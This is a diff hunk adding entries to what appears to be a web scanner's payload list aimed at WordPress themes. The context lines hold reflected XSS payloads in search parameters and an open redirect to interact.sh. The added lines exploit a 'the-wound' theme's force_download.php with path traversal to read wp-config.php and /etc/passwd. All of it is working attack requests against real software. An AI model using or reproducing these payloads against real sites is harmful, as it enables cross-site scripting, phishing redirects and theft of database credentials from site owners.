@@ -46,3 +46,6 @@
 /?ct_keyword=%22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3E&ct_city=0&ct_state=0&ct_zipcode=0&search-listings=true&ct_property_type=0&ct_beds=0&ct_baths=0&ct_price_from&ct_price_to
 /properties-with-map/?status&keyword=%22%3E%3Cimg%20src=x%20onerror=(alert)(document.domain);//%22
 /wp-content/themes/Upward/go.php?https://interact.sh
+/wp-content/themes/the-wound/style.css
+/wp-content/themes/the-wound/force_download.php?file=../../../wp-config.php
+/wp-content/themes/the-wound/force_download.php?file=/etc/passwd
